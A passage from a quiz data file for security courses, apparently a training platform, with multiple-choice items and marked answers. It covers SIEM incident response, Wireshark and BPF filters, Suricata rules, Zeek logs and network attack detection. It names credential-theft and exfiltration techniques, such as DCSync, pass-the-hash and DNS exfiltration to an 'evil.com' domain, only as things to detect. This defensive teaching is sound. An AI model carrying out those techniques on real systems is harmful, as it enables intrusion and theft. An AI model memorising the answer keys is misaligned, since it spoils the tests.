          "Treat as active intrusion. 1102 is anti-forensics (MITRE T1070.001) — especially on a DC. Pull the CENTRAL SIEM copy (which the attacker can't reach), identify the logon session/account that issued the clear, isolate the DC, escalate to IR. Time-of-clear is your timeline pivot.",
          "Ignore.",
          "Reboot the DC."
        ],
        correctAnswer: 1,
        explanation: "Audit-log-cleared on a DC by a non-maintenance account is one of the highest-fidelity 'adversary on critical infra' signals. The SIEM has the central copy precisely because we ship logs off-host — pivot from the 1102 to the issuing session (4624 just before)."
      },
      {
        id: "siem-q5-20",
        difficulty: "medium",
        tags: ["KQL", "Identity"],
        scenario: "Sentinel — find users whose sign-in succeeded with MFA SATISFIED but the MFA method was 'Phone call' from a high-risk country in the last 24h (possible MFA-fatigue or SIM-swap pattern).",
        question: "Sketch the right KQL filter chain:",
        options: [
          "SigninLogs | take 100",
          "SigninLogs | where TimeGenerated > ago(24h) | where ResultType == 0 | where AuthenticationDetails has 'Phone call' | where LocationDetails.countryOrRegion in ('XX','YY') | project UserPrincipalName, IPAddress, AuthenticationDetails, LocationDetails",
          "SigninLogs | where MFA == false",
          "SigninLogs | summarize by AppDisplayName"
        ],
        correctAnswer: 1,
        explanation: "Compound filter on time + success + MFA method + geography + project the columns IR needs. Phone-call MFA from a sudden new country is a strong SIM-swap signal; the rule should surface enough context for a Tier 2 to action in one screen."
      },
      {
        id: "siem-q5-21",
        difficulty: "hard",
        tags: ["Detection Gap"],
        scenario: "ATT&CK Navigator overlay shows your detection covers Execution and Defense Evasion well, but Credential Access and Lateral Movement are mostly empty.",
        question: "What does this tell you, and what's the next action?",
        options: [
          "Coverage is balanced.",
          "You'll catch the loud first stages and the noisy evasion but likely MISS the quiet middle of an intrusion — where attackers harvest creds and pivot. Build detections for Credential Access (LSASS access, Kerberoasting, AS-REP, DCSync) and Lateral Movement (anomalous SMB/RDP/WinRM patterns) as priority.",
          "Delete the existing rules.",
          "Buy more storage."
        ],
        correctAnswer: 1,
        explanation: "The middle of the kill chain is where dwell time hides. ATT&CK heatmaps make these gaps visible AND prioritizable. Coverage of Execution + Evasion only is the classic 'we catch initial loud activity then go blind' SOC."
      },
      {
        id: "siem-q5-22",
        difficulty: "medium",
        tags: ["Detection Rule Design"],
        scenario: "You propose a new rule. Reviewer checklist asks: 'How will an analyst know if this fires by mistake?'",
        question: "What must accompany the rule?",
        options: [
          "Nothing — analysts will figure it out.",
          "Documented FALSE-POSITIVE patterns (known benign sources, expected triggers) AND a triage runbook: 'If you see X, it's likely benign because Y; verify by checking Z; escalate when ...'. Detection delivery is rule + runbook + FP profile.",
          "Just the rule logic.",
          "A meme."
        ],
        correctAnswer: 1,
        explanation: "Detections without FP profiles + runbooks are guaranteed to become noisy and ignored. Detection engineering's deliverable is a USABLE rule, not a clever query. This is the single biggest cultural lever for SOC quality."
      },
      {
        id: "siem-q5-23",
        difficulty: "easy",
        tags: ["SOC Success"],
        scenario: "Leadership asks: 'What's the most important factor for SIEM success?'",
        question: "Best answer:",
        options: [
          "The most expensive platform.",
          "Skilled analysts/engineers who understand the environment, write and tune detections, run a disciplined detection lifecycle, and continuously close coverage gaps. Tools amplify capability; they do not create it.",
          "Ingesting maximum data.",
          "Fully automated, zero humans."
        ],
        correctAnswer: 1,
        explanation: "Every survey of SOC effectiveness lands here. Vendor capability matters; people + process beat platform every time. A great team on a mid-tier SIEM outperforms an absent team on the best SIEM."
      },
      {
        id: "siem-q5-24",
        difficulty: "hard",
        tags: ["End-to-End"],
        scenario: "Putting it all together — an alert fires at 03:14: 'PowerShell EncodedCommand executed from winword.exe child process on FIN-HR-04.' Walk the optimal end-to-end SOC flow.",
        question: "Best sequence:",
        options: [
          "Acknowledge → close.",
          "Triage (asset = CFO laptop; enrich w/ user, recent emails, EDR process tree) → Contain (isolate host via EDR, force re-auth on user) → Investigate (decode the PS, hunt the parent doc, pivot on any C2 domain across all hosts) → Eradicate (kill persistence, rotate creds, remove artefacts) → Recover (re-image, monitor for re-infection) → Lessons learned (update detection, add IOC to TI, share with peers).",
          "Page → close.",
          "Ignore — false positive."
        ],
        correctAnswer: 1,
        explanation: "This is the SANS-style IR loop (Triage → Contain → Investigate → Eradicate → Recover → Lessons Learned), executed THROUGH the SIEM as the system of record. Every step generates SIEM evidence; lessons-learned closes the loop by improving detections."
      },
      {
        id: "siem-q5-25",
        difficulty: "medium",
        tags: ["Culture"],
        scenario: "After 6 months, your SOC ships:\n  - 60 actionable alerts/day (was 4,000)\n  - 92% true-positive rate (was 11%)\n  - MTTD 14 min (was 6 hours)\n  - 100% of detections mapped to ATT&CK with quarterly gap review\nLeadership asks: 'How did you do it?'",
        question: "What's the honest answer?",
        options: [
          "Bought a bigger SIEM.",
          "Treated detection as engineering: Sigma-first rules in Git with CI replay tests; risk-based alerting; ATT&CK-driven coverage planning; runbooks and FP profiles per rule; tiered storage; ruthless tuning cadence; analyst burnout treated as a KPI.",
          "Hired 50 more analysts.",
          "Disabled most alerts."
        ],
        correctAnswer: 1,
        explanation: "Mature SOCs win by engineering discipline applied to detection: source control, tests, code review, lifecycle management, measurable outcomes. Tooling enables it; discipline produces the results."
      }
    ]
  },
  // ===== Network Security Monitoring Course Quizzes =====
  {
    quizId: "nsm-q1",
    courseId: "network-security-monitoring",
    title: "NSM Foundations",
    description: "Test your understanding of Network Security Monitoring principles, protocols, and sensor architecture.",
    passingScore: 70,
    timeLimit: 15,
    questions: [
      {
        id: "nsm-q1-1",
        question: "What distinguishes Network Security Monitoring from traditional intrusion detection?",
        options: [
          "NSM only uses signature-based detection",
          "NSM focuses on collection, detection, AND analysis of network data for situational awareness",
          "NSM replaces the need for endpoint security entirely",
          "NSM only monitors wireless networks"
        ],
        correctAnswer: 1,
        explanation: "NSM goes beyond simple alerting by combining data collection, detection, and human-driven analysis to build comprehensive situational awareness of network activity."
      },
      {
        id: "nsm-q1-2",
        question: "During a TCP three-way handshake, what is the correct sequence of flags?",
        options: [
          "ACK → SYN → SYN-ACK",
          "SYN → SYN-ACK → ACK",
          "SYN → ACK → SYN-ACK",
          "FIN → SYN → ACK"
        ],
        correctAnswer: 1,
        explanation: "The TCP three-way handshake proceeds: client sends SYN, server responds with SYN-ACK, client completes with ACK — establishing a reliable connection."
      },
      {
        id: "nsm-q1-3",
        question: "Why is UDP significant from a security monitoring perspective?",
        options: [
          "UDP is always encrypted",
          "UDP's connectionless nature makes it harder to track sessions and easier for attackers to spoof",
          "UDP cannot be used for data exfiltration",
          "UDP traffic is automatically blocked by firewalls"
        ],
        correctAnswer: 1,
        explanation: "UDP is connectionless with no handshake, making it difficult to track sessions and easy for attackers to spoof source addresses — commonly abused in DNS amplification attacks and covert channels."
      },
      {
        id: "nsm-q1-4",
        question: "At which OSI layer does a network TAP operate to capture traffic?",
        options: [
          "Layer 7 – Application",
          "Layer 4 – Transport",
          "Layer 1 – Physical",
          "Layer 3 – Network"
        ],
        correctAnswer: 2,
        explanation: "Network TAPs operate at the Physical layer (Layer 1), creating an exact electrical or optical copy of all traffic passing through a link without introducing latency."
      },
      {
        id: "nsm-q1-5",
        question: "What is the primary disadvantage of using a SPAN/mirror port compared to a network TAP?",
        options: [
          "SPAN ports are more expensive than TAPs",
          "SPAN ports can drop packets under heavy load and may miss full-duplex traffic",
          "SPAN ports only capture Layer 2 traffic",
          "SPAN ports require custom hardware"
        ],
        correctAnswer: 1,
        explanation: "SPAN ports mirror traffic via the switch CPU, which can drop packets under load. They may also not capture Layer 1 errors, malformed frames, or full-duplex conversations accurately."
      },
      {
        id: "nsm-q1-6",
        question: "Which DNS record type maps a domain name to an IPv4 address?",
        options: [
          "MX record",
          "CNAME record",
          "A record",
          "TXT record"
        ],
        correctAnswer: 2,
        explanation: "The A (Address) record maps a domain name to an IPv4 address. AAAA records serve the same purpose for IPv6 addresses."
      },
      {
        id: "nsm-q1-7",
        question: "What is the purpose of the TTL field in an IP packet header from a defender's perspective?",
        options: [
          "It encrypts the packet payload",
          "It limits the packet's lifetime and can reveal OS fingerprinting and routing anomalies",
          "It specifies the packet's priority level",
          "It determines the maximum segment size"
        ],
        correctAnswer: 1,
        explanation: "TTL (Time to Live) limits how many hops a packet can traverse. Different operating systems set different initial TTL values, enabling passive OS fingerprinting. Unusual TTL values can also indicate tunneling or spoofing."
      },
      {
        id: "nsm-q1-8",
        question: "Which sensor placement strategy provides the broadest visibility of external threats?",
        options: [
          "Behind the internal firewall only",
          "On individual endpoint machines",
          "At the network perimeter between the external firewall and the internet",
          "Only on the DMZ segment"
        ],
        correctAnswer: 2,
        explanation: "Placing sensors at the network perimeter captures all inbound and outbound traffic before internal filtering, providing maximum visibility of external threat actor activity."
      },
      {
        id: "nsm-q1-9",
        question: "What does the term 'full content data' mean in NSM?",
        options: [
          "Only metadata about connections",
          "Complete packet captures including headers and payloads",
          "Firewall logs only",
          "Summary statistics of network flows"
        ],
        correctAnswer: 1,
        explanation: "Full content data refers to complete packet captures (PCAPs) that include all headers and payloads — the most detailed form of network evidence, essential for forensic analysis."
      },
      {
        id: "nsm-q1-10",
        question: "Which protocol typically uses port 443 and obscures payload content from network monitors?",
        options: [
          "HTTP",
          "DNS",
          "HTTPS/TLS",
          "FTP"
        ],
        correctAnswer: 2,
        explanation: "HTTPS uses TLS encryption on port 443, making payload inspection impossible without TLS interception. Attackers frequently use HTTPS for C2 to blend with legitimate traffic."
      }
    ]
  },
  {
    quizId: "nsm-q2",
    courseId: "network-security-monitoring",
    title: "Packet Capture & Wireshark",
    description: "Assess your skills in packet capture, Wireshark filters, and traffic analysis techniques.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "nsm-q2-1",
        question: "What is the difference between a Wireshark capture filter and a display filter?",
        options: [
          "They are identical in syntax and function",
          "Capture filters use BPF syntax and limit what is recorded; display filters use Wireshark syntax and filter what is shown from already captured data",
          "Display filters are applied before capture begins",
          "Capture filters only work on wireless interfaces"
        ],
        correctAnswer: 1,
        explanation: "Capture filters (BPF syntax, e.g., 'host 10.0.0.1') determine what packets are saved to disk. Display filters (Wireshark syntax, e.g., 'ip.addr == 10.0.0.1') filter the view of already-captured data."
      },
      {
        id: "nsm-q2-2",
        question: "Which Wireshark display filter shows only HTTP GET requests?",
        options: [
          "tcp.port == 80",
          "http.request.method == \"GET\"",
          "http contains GET",
          "filter http get"
        ],
        correctAnswer: 1,
        explanation: "The display filter 'http.request.method == \"GET\"' precisely targets HTTP GET requests by filtering on the parsed HTTP request method field."
      },
      {
        id: "nsm-q2-3",
        question: "When reconstructing a TCP stream in Wireshark, what feature do you use?",
        options: [
          "Edit → Preferences → TCP",
          "Right-click a packet → Follow → TCP Stream",
          "Statistics → Flow Graph",
          "Analyze → Expert Info"
        ],
        correctAnswer: 1,
        explanation: "Right-clicking a TCP packet and selecting Follow → TCP Stream reassembles the entire conversation between client and server, showing the data exchanged in order."
      },
      {
        id: "nsm-q2-4",
        question: "What does a high number of TCP RST packets from a single source IP likely indicate?",
        options: [
          "Normal web browsing activity",
          "Port scanning or connection probing",
          "Successful file transfers",
          "DNS resolution activity"
        ],
        correctAnswer: 1,
        explanation: "Large volumes of RST packets from one source typically indicate port scanning — the source is probing closed ports or services that reject the connection attempt."
      },
      {
        id: "nsm-q2-5",
        question: "Which indicator in DNS traffic suggests possible DNS tunneling?",
        options: [
          "Standard A record queries to well-known domains",
          "Unusually long subdomain labels, high query volume to a single domain, and TXT record queries",
          "PTR record lookups for internal IPs",
          "SOA queries during zone transfers"
        ],
        correctAnswer: 1,
        explanation: "DNS tunneling encodes data in subdomain labels (creating abnormally long queries), generates high query volumes, and often uses TXT records to carry larger response payloads."
      },
      {
        id: "nsm-q2-6",
        question: "What is the Wireshark display filter to show all packets from or to subnet 192.168.1.0/24?",
        options: [
          "ip.src == 192.168.1.0/24",
          "ip.addr == 192.168.1.0/24",
          "net 192.168.1.0/24",
          "host 192.168.1.*"
        ],
        correctAnswer: 1,
        explanation: "The display filter 'ip.addr == 192.168.1.0/24' matches any packet where either the source or destination IP falls within the specified CIDR range."
      },
      {
        id: "nsm-q2-7",
        question: "How can you extract files transferred over HTTP from a PCAP in Wireshark?",
        options: [
          "Edit → Find Packet → String",
          "File → Export Objects → HTTP",
          "Statistics → Endpoints",
          "Analyze → Follow HTTP Stream"
        ],
        correctAnswer: 1,
        explanation: "File → Export Objects → HTTP lists all files transferred over HTTP in the capture, allowing you to save them individually — critical for extracting malware samples or exfiltrated documents."
      },
      {
        id: "nsm-q2-8",
        question: "What does TCP retransmission indicate in a packet capture?",
        options: [
          "The connection is encrypted",
          "Packet loss occurred and the sender is resending unacknowledged segments",
          "The firewall is blocking traffic",
          "The application is sending duplicate data intentionally"
        ],
        correctAnswer: 1,
        explanation: "TCP retransmissions occur when the sender doesn't receive an ACK within the timeout period, indicating packet loss due to network congestion, faulty hardware, or potential interference."
      },
      {
        id: "nsm-q2-9",
        question: "Which BPF capture filter captures only traffic on port 53?",
        options: [
          "dns.port == 53",
          "port 53",
          "tcp.port == 53",
          "filter port=53"
        ],
        correctAnswer: 1,
        explanation: "The BPF capture filter 'port 53' captures both TCP and UDP traffic on port 53 (DNS). BPF syntax differs from Wireshark display filter syntax."
      },
      {
        id: "nsm-q2-10",
        question: "What suspicious pattern would you look for in HTTP traffic to detect a webshell?",
        options: [
          "Large image downloads",
          "POST requests to unusual file paths with command-like parameters and small response sizes",
          "Standard GET requests to the homepage",
          "JavaScript file downloads"
        ],
        correctAnswer: 1,
        explanation: "Webshells often manifest as POST requests to odd file paths (e.g., /uploads/shell.php) with command parameters (cmd=whoami), returning small text responses — distinct from normal web traffic patterns."
      }
    ]
  },
  {
    quizId: "nsm-q3",
    courseId: "network-security-monitoring",
    title: "Suricata IDS/IPS",
    description: "Evaluate your knowledge of Suricata rule writing, alert tuning, and intrusion detection concepts.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "nsm-q3-1",
        question: "What is the basic structure of a Suricata rule?",
        options: [
          "IF-THEN-ELSE conditional blocks",
          "Action, Header (protocol/IPs/ports/direction), and Rule Options (in parentheses)",
          "XML-formatted detection signatures",
          "JSON objects with match criteria"
        ],
        correctAnswer: 1,
        explanation: "Suricata rules follow: ACTION PROTOCOL SRC_IP SRC_PORT -> DST_IP DST_PORT (options;). For example: alert http $HOME_NET any -> $EXTERNAL_NET any (msg:\"Suspicious UA\"; content:\"evil\"; sid:100001;)."
      },
      {
        id: "nsm-q3-2",
        question: "What does the 'content' keyword do in a Suricata rule?",
        options: [
          "Specifies the file type to inspect",
          "Matches a specific byte pattern or string within the packet payload or header",
          "Sets the logging output format",
          "Defines the rule category"
        ],
        correctAnswer: 1,
        explanation: "The 'content' keyword performs pattern matching against packet data. It can match ASCII strings or hex byte sequences (e.g., content:|de ad be ef|;) and supports modifiers like nocase, depth, and offset."
      },
      {
        id: "nsm-q3-3",
        question: "What is the purpose of the 'flow' keyword in Suricata rules?",
        options: [
          "To measure network bandwidth",
          "To specify the direction and state of the connection (established, to_server, to_client)",
          "To count the number of packets in a session",
          "To define flow chart diagrams"
        ],
        correctAnswer: 1,
        explanation: "The 'flow' keyword matches on TCP session state and direction. 'flow:established,to_server;' targets data sent from client to server on established connections, reducing false positives on handshake traffic."
      },
      {
        id: "nsm-q3-4",
        question: "How does the 'threshold' keyword help reduce alert fatigue?",
        options: [
          "It deletes alerts automatically after a set time",
          "It limits alerting frequency, e.g., alerting once per source IP within a time window instead of per-packet",
          "It increases the priority of all alerts",
          "It disables alerts permanently"
        ],
        correctAnswer: 1,
        explanation: "Thresholds control alert rate — 'threshold:type limit,track by_src,count 1,seconds 300;' fires only once per source IP every 5 minutes, preventing alert floods from repetitive activity."
      },
      {
        id: "nsm-q3-5",
        question: "What is the difference between Suricata running in IDS mode versus IPS mode?",
        options: [
          "There is no difference",
          "IDS passively monitors and alerts; IPS is inline and can actively block or drop malicious traffic",
          "IDS blocks traffic; IPS only monitors",
          "IPS requires more rules than IDS"
        ],
        correctAnswer: 1,
        explanation: "In IDS mode, Suricata passively copies and analyzes traffic. In IPS (inline) mode, traffic flows through Suricata, enabling 'drop' and 'reject' actions to block malicious packets in real time."
      },
      {
        id: "nsm-q3-6",
        question: "Which Suricata rule action would you use to silently discard a malicious packet in IPS mode?",
        options: [
          "alert",
          "pass",
          "drop",
          "log"
        ],
        correctAnswer: 2,
        explanation: "The 'drop' action silently discards the matching packet and generates an alert. 'reject' also sends a reset/ICMP unreachable to the sender. 'pass' whitelists the traffic."
      },
      {
        id: "nsm-q3-7",
        question: "What does the 'pcre' keyword allow you to do in Suricata rules?",
        options: [
          "Parse PCAP files directly",
          "Use Perl Compatible Regular Expressions for complex pattern matching",
          "Compress packet data",
          "Convert packets to PDF format"
        ],
        correctAnswer: 1,
        explanation: "The 'pcre' keyword enables regex-based matching for complex patterns that simple content matches can't express, like variable-length strings or pattern alternatives."
      },
      {
        id: "nsm-q3-8",
        question: "What is a 'suppress' rule in Suricata used for?",
        options: [
          "To increase the severity of an alert",
          "To prevent specific alerts from being generated for certain IPs or subnets without disabling the rule entirely",
          "To encrypt alert output",
          "To forward alerts to another system"
        ],
        correctAnswer: 1,
        explanation: "Suppress rules silence alerts for specific track conditions (e.g., suppress gen_id 1, sig_id 2001, track by_src, ip 10.0.0.5) — useful for whitelisting known-good sources without disabling the detection globally."
      },
      {
        id: "nsm-q3-9",
        question: "What does the 'sid' keyword represent in a Suricata rule?",
        options: [
          "Session Identifier",
          "Signature ID — a unique identifier for each rule",
          "Source ID — identifying the traffic source",
          "Security Impact Descriptor"
        ],
        correctAnswer: 1,
        explanation: "SID (Signature ID) is a unique numeric identifier for each Suricata rule. Custom rules typically use SID values starting at 1000000 to avoid conflicts with community rulesets."
      },
      {
        id: "nsm-q3-10",
        question: "Which Suricata feature enables extraction and logging of TLS certificate metadata without decryption?",
        options: [
          "file-store module",
          "TLS/SSL parser logging fields like tls.subject, tls.issuer, tls.ja3.hash",
          "HTTP log module",
          "DNS parser"
        ],
        correctAnswer: 1,
        explanation: "Suricata's TLS parser extracts certificate metadata (subject, issuer, serial, JA3/JA3S fingerprints) from the handshake without requiring decryption — powerful for detecting suspicious certificates and known-bad TLS fingerprints."
      }
    ]
  },
  {
    quizId: "nsm-q4",
    courseId: "network-security-monitoring",
    title: "Zeek Network Metadata",
    description: "Test your proficiency with Zeek logs, UID correlation, and network metadata analysis.",
    passingScore: 70,
    timeLimit: 20,
    questions: [
      {
        id: "nsm-q4-1",
        question: "What makes Zeek fundamentally different from Suricata in its approach to network analysis?",
        options: [
          "Zeek is only a firewall",
          "Zeek focuses on generating rich metadata logs about every connection rather than signature-based alerting",
          "Zeek can only analyze offline PCAPs",
          "Zeek replaces the need for packet capture"
        ],
        correctAnswer: 1,
        explanation: "Zeek generates structured metadata logs (conn.log, dns.log, http.log, etc.) about all network activity. While it supports scripting-based detection, its primary strength is comprehensive network visibility through logs."
      },
      {
        id: "nsm-q4-2",
        question: "What is the 'uid' field in Zeek's conn.log used for?",
        options: [
          "User identification for authentication",
          "A unique connection identifier that correlates entries across all Zeek log files for the same session",
          "The Unix user running the Zeek process",
          "A checksum of the packet payload"
        ],
        correctAnswer: 1,
        explanation: "The UID is a unique string assigned to each connection. The same UID appears in conn.log, dns.log, http.log, files.log, etc., allowing analysts to trace all activity belonging to a single session."
      },
      {
        id: "nsm-q4-3",
        question: "In Zeek's conn.log, what does a connection with 'conn_state: S0' indicate?",
        options: [
          "A fully established and closed connection",
          "A SYN was sent but no SYN-ACK was received — the connection attempt was unanswered",
          "An established connection that was reset",
          "A UDP connection with data exchange"
        ],
        correctAnswer: 1,
        explanation: "S0 means a SYN was sent with no reply, indicating the target port is filtered, the host is unreachable, or a stealthy scan is in progress. Large volumes of S0 connections from one source strongly suggest port scanning."
      },
      {
        id: "nsm-q4-4",
        question: "Which Zeek log would you analyze to detect DNS tunneling?",
        options: [
          "conn.log",
          "dns.log — looking for unusually long queries, high volume to single domains, and TXT responses",
          "ssl.log",
          "smtp.log"
        ],
        correctAnswer: 1,
        explanation: "dns.log records all DNS queries and responses. DNS tunneling indicators in this log include abnormally long query strings, high query frequency to a single parent domain, and TXT record abuse."
      },
      {
        id: "nsm-q4-5",
        question: "What information does Zeek's ssl.log provide that is valuable for threat detection?",
        options: [
          "The decrypted content of HTTPS sessions",
          "Certificate details, JA3/JA3S fingerprints, server name (SNI), and validation status",
          "Only the source and destination IPs",
          "Firewall rule match results"
        ],
        correctAnswer: 1,
        explanation: "ssl.log records TLS handshake metadata: certificate subject/issuer, JA3/JA3S hashes, SNI values, and validation status — enabling detection of self-signed certs, expired certs, and known malicious TLS fingerprints."
      },
      {
        id: "nsm-q4-6",
        question: "How would you use Zeek logs to identify potential C2 beaconing?",
        options: [
          "Look for connections with large file downloads",
          "Analyze conn.log for connections with regular time intervals, consistent byte sizes, and long durations to the same destination",
          "Check smtp.log for outbound emails",
          "Review notice.log for system errors"
        ],
        correctAnswer: 1,
        explanation: "C2 beacons produce regular connection patterns visible in conn.log: consistent intervals between connections, similar request/response sizes, long session durations, and persistence to the same external IP."
      },
      {
        id: "nsm-q4-7",
        question: "What is the purpose of Zeek's files.log?",
        options: [
          "Logging filesystem changes on the Zeek server",
          "Recording metadata about every file transferred over the network, including hashes and MIME types",
          "Listing Zeek configuration files",
          "Tracking log file rotation"
        ],
        correctAnswer: 1,
        explanation: "files.log records metadata for every file transferred over monitored protocols: SHA256/MD5 hashes, MIME types, file sizes, source/destination, and extraction status — enabling malware detection via hash matching."
      },
      {
        id: "nsm-q4-8",
        question: "What does a Zeek 'notice' represent?",
        options: [
          "A system error in the Zeek process",
          "A higher-level detection event generated by Zeek's analysis framework when policy-relevant activity is observed",
          "A debug message for developers",
          "A notification about Zeek software updates"
        ],
        correctAnswer: 1,
        explanation: "Notices are Zeek's built-in detection mechanism — generated when the analysis framework identifies policy-relevant activity like SSL certificate issues, scan detection, or protocol violations."
      },
      {
        id: "nsm-q4-9",
        question: "Which Zeek command-line option reads a PCAP file for offline analysis?",
        options: [
          "zeek --live",
          "zeek -r capture.pcap",
          "zeek --import capture.pcap",
          "zeek --offline capture.pcap"
        ],
        correctAnswer: 1,
        explanation: "The '-r' flag reads a PCAP file for offline analysis: 'zeek -r capture.pcap' processes the file and generates all applicable log files — the same analysis as live monitoring."
      },
      {
        id: "nsm-q4-10",
        question: "What is a practical use case for Zeek scripting?",
        options: [
          "Replacing Suricata entirely",
          "Creating custom log fields, triggering notices on specific conditions, or enriching data with external intelligence feeds",
          "Compiling packet captures into video",
          "Generating firewall rules automatically"
        ],
        correctAnswer: 1,
        explanation: "Zeek scripts extend analysis capabilities: adding custom fields to logs, creating detection logic (e.g., alerting on connections to threat intel IPs), computing statistics, or extracting files matching specific criteria."
      }
    ]
  },
  {
    quizId: "nsm-q5",
    courseId: "network-security-monitoring",
    title: "Network Attack Detection",
    description: "Challenge your ability to detect reconnaissance, C2, lateral movement, and data exfiltration on the network.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "nsm-q5-1",
        question: "Which network behavior most strongly indicates a TCP SYN scan (half-open scan)?",
        options: [
          "Completed TCP handshakes followed by data transfer",
          "SYN packets to many ports with RST responses and no completed handshakes",
          "Large volumes of UDP traffic",
          "ICMP echo requests to multiple hosts"
        ],
        correctAnswer: 1,
        explanation: "A SYN scan sends SYN packets to target ports. Open ports reply SYN-ACK (scanner sends RST), closed ports reply RST. No handshakes complete — visible as many S0/REJ states in Zeek conn.log."
      },
      {
        id: "nsm-q5-2",
        question: "What is JA3 fingerprinting and why is it useful for detecting C2?",
        options: [
          "A technique to decrypt TLS traffic",
          "An MD5 hash of specific TLS Client Hello parameters that uniquely identifies client applications regardless of IP or domain",
          "A method to block all HTTPS traffic",
          "A DNS-based threat intelligence feed"
        ],
        correctAnswer: 1,
        explanation: "JA3 hashes the TLS version, cipher suites, extensions, and elliptic curves from the Client Hello. Malware families produce consistent JA3 fingerprints, enabling detection even when attackers rotate domains and IPs."
      },
      {
        id: "nsm-q5-3",
        question: "How does C2 beaconing typically appear in network traffic?",
        options: [
          "Random connections to many different destinations",
          "Periodic connections at regular or near-regular intervals to the same destination with consistent packet sizes",
          "One-time large file downloads",
          "Inbound connections from multiple countries simultaneously"
        ],
        correctAnswer: 1,
        explanation: "Beaconing produces a rhythmic pattern: connections at fixed intervals (with possible jitter), similar request/response sizes, to the same destination — distinguishable from human-driven traffic's irregular patterns."
      },
      {
        id: "nsm-q5-4",
        question: "Which network protocol is commonly abused for lateral movement using PsExec?",
        options: [
          "HTTP on port 80",
          "SMB on port 445",
          "DNS on port 53",
          "SMTP on port 25"
        ],
        correctAnswer: 1,
        explanation: "PsExec uses SMB (port 445) to copy an executable to the target's ADMIN$ share and create a remote service. Detecting SMB writes to ADMIN$ followed by service creation is a key lateral movement indicator."
      },
      {
        id: "nsm-q5-5",
        question: "What network-level indicator suggests RDP-based lateral movement?",
        options: [
          "HTTP POST requests between internal hosts",
          "Internal-to-internal connections on port 3389, especially from hosts that don't normally initiate RDP",
          "DNS queries for external domains",
          "ICMP traffic between servers"
        ],
        correctAnswer: 1,
        explanation: "RDP lateral movement appears as port 3389 connections between internal hosts. Baselines of normal RDP usage help identify anomalous sessions — especially from workstations to servers or unusual source hosts."
      },
      {
        id: "nsm-q5-6",
        question: "Which technique uses DNS queries to secretly extract data from a network?",
        options: [
          "DNS amplification attack",
          "DNS exfiltration — encoding stolen data in subdomain labels of queries to attacker-controlled domains",
          "DNS cache poisoning",
          "DNS zone transfer"
        ],
        correctAnswer: 1,
        explanation: "DNS exfiltration encodes data in subdomain queries (e.g., base64data.evil.com). Since DNS is rarely blocked, attackers can slowly extract data — detectable by monitoring query length, volume, and entropy."
      },
      {
        id: "nsm-q5-7",
        question: "What is a 'low and slow' exfiltration technique designed to evade?",
        options: [
          "Endpoint antivirus scans",
          "Volume-based and rate-based network detection thresholds",
          "Physical security controls",
          "User authentication systems"
        ],
        correctAnswer: 1,
        explanation: "Low-and-slow exfiltration sends small amounts of data over long periods to stay under volume thresholds and rate-based alerts. Detection requires baselining normal traffic patterns and looking for cumulative anomalies."
      },
      {
        id: "nsm-q5-8",
        question: "How can you detect pass-the-hash attacks on the network?",
        options: [
          "By monitoring HTTP headers",
          "By detecting NTLM authentication over SMB/RPC where the same NTLM hash authenticates to multiple systems in a short timeframe",
          "By checking DNS query patterns",
          "By analyzing email attachments"
        ],
        correctAnswer: 1,
        explanation: "Pass-the-hash uses stolen NTLM hashes for authentication. Network indicators include NTLM (not Kerberos) authentication, the same account authenticating to many systems rapidly, and type-3 NTLM messages without prior type-1/type-2."
      },
      {
        id: "nsm-q5-9",
        question: "Which of the following would indicate potential data staging before exfiltration?",
        options: [
          "Normal email traffic patterns",
          "Unusual SMB file copy activity to a single internal host followed by large outbound transfers from that host",
          "Standard software update downloads",
          "Routine backup traffic to designated servers"
        ],
        correctAnswer: 1,
        explanation: "Attackers often stage data by copying files from multiple internal sources to a single collection point, then exfiltrating from there — visible as unusual inbound SMB activity followed by anomalous outbound connections."
      },
      {
        id: "nsm-q5-10",
        question: "What makes ICMP tunneling difficult to detect without proper monitoring?",
        options: [
          "ICMP is always encrypted",
          "ICMP echo requests/replies are common and often allowed through firewalls, but the data payload field can carry hidden communication",
          "ICMP only works on internal networks",
          "ICMP traffic is never logged by any tool"
        ],
        correctAnswer: 1,
        explanation: "ICMP echo (ping) is universally allowed. Attackers embed data in the payload field. Detection requires inspecting ICMP payload sizes (abnormally large), content (non-standard patterns), and session frequency."
      }
    ]
  },
  {
    quizId: "nsm-q6",
    courseId: "network-security-monitoring",
    title: "Practical NSM Operations",
    description: "Final assessment on building NSM workflows, network forensics, and operational best practices.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "nsm-q6-1",
        question: "What is the recommended architecture for integrating Zeek and Suricata into a SIEM?",
        options: [
          "Run both tools on the SIEM server itself",
          "Deploy both on sensors with a log shipper (e.g., Filebeat) forwarding to a centralized SIEM for correlation and alerting",
          "Only use one tool at a time, never both",
          "Store all data locally on each sensor without centralization"
        ],
        correctAnswer: 1,
        explanation: "Best practice is sensor-based deployment with centralized analysis: Zeek and Suricata run on network sensors, Filebeat ships logs to a SIEM (e.g., Elastic/Splunk), enabling cross-source correlation and unified alerting."
      },
      {
        id: "nsm-q6-2",
        question: "When preserving network evidence for forensic investigation, which principle is most critical?",
        options: [
          "Immediately analyze all PCAPs on the production sensor",
          "Maintain chain of custody with hashing, timestamps, and write-protected copies of original evidence",
          "Delete old captures to save disk space",
          "Share raw PCAPs via email to the legal team"
        ],
        correctAnswer: 1,
        explanation: "Forensic integrity requires chain of custody: hash original PCAPs immediately (SHA256), record collection timestamps, work on copies only, document every access, and store originals on write-protected media."
      },
      {
        id: "nsm-q6-3",
        question: "How do you construct a network forensics timeline from Zeek logs?",
        options: [
          "Sort alerts by severity only",
          "Correlate events across Zeek logs using timestamps and UIDs to build a chronological sequence of attacker actions",
          "Only use conn.log and ignore other log types",
          "Rely solely on firewall logs"
        ],
        correctAnswer: 1,
        explanation: "Timeline construction uses Zeek's UID to link conn.log → dns.log → http.log → files.log entries for the same session, then orders all correlated events chronologically to reconstruct the attacker's progression."
      },
      {
        id: "nsm-q6-4",
        question: "What is the primary risk of running Suricata with outdated rule sets?",
        options: [
          "The system will crash",
          "New attack techniques and malware variants will go undetected while only known-old threats are caught",
          "Network performance will degrade",
          "Log files will become corrupted"
        ],
        correctAnswer: 1,
        explanation: "Outdated rules miss new CVE exploits, recent malware C2 patterns, and evolving TTPs. Best practice is automated daily rule updates (e.g., suricata-update) combined with custom rules for environment-specific threats."
      },
      {
        id: "nsm-q6-5",
        question: "Which metric best indicates the health and coverage of an NSM deployment?",
        options: [
          "Total number of alerts generated per day",
